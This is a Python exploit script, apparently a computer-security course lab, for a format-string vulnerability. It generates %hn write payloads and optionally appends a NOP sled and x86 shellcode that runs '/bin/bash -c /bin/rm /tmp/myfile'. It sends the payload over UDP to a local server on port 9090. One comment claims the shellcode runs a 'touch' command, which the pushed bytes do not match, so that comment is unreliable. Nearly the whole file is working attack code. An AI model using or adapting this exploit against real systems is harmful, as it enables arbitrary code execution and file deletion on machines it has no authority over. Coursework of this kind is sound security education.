#!/usr/bin/python3

# Made by Chirag for CSE643: Computer Security

import sys, os

shellcode= (
    # Push the command '/bin////bash' into stack (//// is equivalent to /)
    "\x31\xc0"                      # xorl %eax,%eax
    "\x50"                          # pushl %eax
    "\x68""bash"                    # pushl "bash"
    "\x68""////"                    # pushl "////"
    "\x68""/bin"                    # pushl "/bin"
    "\x89\xe3"                      # movl %esp, %ebx  

    # Push the 1st argument '-ccc' into stack (-ccc is equivalent to -c)
    "\x31\xc0"                      # xorl %eax,%eax
    "\x50"                          # pushl %eax
    "\x68""-ccc"                    # pushl "-ccc"
    "\x89\xe0"                      # movl %esp, %eax


    # Push the 2nd argument '/usr/bin/touch /tmp/CTF/team.jpg' into stack
    "\x31\xd2"                      # xorl %edx,%edx
    "\x52"                          # pushl %edx
    "\x68""ile "                    # pushl "ile "
    "\x68""/myf"                    # pushl "/myf"
    "\x68""/tmp"                    # pushl "/tmp"
    "\x68""/rm "                    # pushl "/rm "
    "\x68""/bin"                    # pushl "/bin"
    "\x89\xe2"                      # movl %esp,%edx

    # Construct the argv[] array and set ecx
    "\x31\xc9"                      # xorl %ecx,%ecx
    "\x51"                          # pushl %ecx
    "\x52"                          # pushl %edx
    "\x50"                          # pushl %eax
    "\x53"                          # pushl %ebx
    "\x89\xe1"                      # movl %esp,%ecx  

    # Set edx to 0
    "\x31\xd2"                      #xorl %edx,%edx  

    # Invoke the system call
    "\x31\xc0"                      # xorl %eax,%eax
    "\xb0\x0b"                      # movb $0x0b,%al
    "\xcd\x80"                      # int $0x80
).encode('latin-1')

def ft_create_payload(t_addr, r_addr, count):
	t_addr = int(t_addr,16)
	r = [int(r_addr[2:6], 16),int(r_addr[-4:], 16)]
	r1 = r2 = 0
	t1 = t2 = 0

	if r[0] > r[1]:
		t1 = t_addr
		t2 = t_addr + 2
		r2 = r[0]
		r1 = r[1]
	else:
		t1 = t_addr + 2
		t2 = t_addr
		r2 = r[1]
		r1 = r[0]


	payload = t1.to_bytes(4,byteorder = 'little')
	payload += "@@@@".encode()
	payload += t2.to_bytes(4,byteorder = 'little')
	payload += ("".join(["%.8x" * count])).encode()

	printed = 12 + count * 8
	z = r1 - printed
	k = r2 - r1
	payload = payload + ("%." +str(z) + "x%hn" ).encode()
	payload = payload + ("%." +str(k) + "x%hn" ).encode()

	print("payload", printed)
	return payload

def ft_create_payload_shell(t_addr, r_addr, count):
	payload = ft_create_payload(t_addr, r_addr, count)

	payload = payload + b"\x90" *100 + shellcode
	# print(len(payload))

	return payload

def attack(payload):
	fp = open("payload",'wb')
	fp.write(payload)
	fp.close()

	os.system("/bin/bash -c \"cat payload > /dev/udp/127.0.0.1/9090\"")
	return

def main(argv):
	if "-H" in argv or '--help' in argv or "-h" in argv:
		print("Usage: ./myscipt.py -t <t_add> -c <%.8x...c> -t <replace value>")
		print("-t : target address as 0xffffffff")
		print("-c : count of %.8x")
		print("-r : address to be filled in as as 0xffffffff")
		print("This program only works for certain caces")
	else:
		if len(argv) != 7 and "--shell" not in argv:
			print("invalid aruguments")
			return
	
		t_addr = argv[argv.index("-t")+1]
		r_addr = argv[argv.index("-r")+1]
		count =int(argv[argv.index("-c")+1])
		if "--shell" not in argv:
			payload = ft_create_payload(t_addr, r_addr, count)
		else:
			payload = ft_create_payload_shell(t_addr, r_addr, count)
		attack(payload)

if __name__ == '__main__':
	main(sys.argv)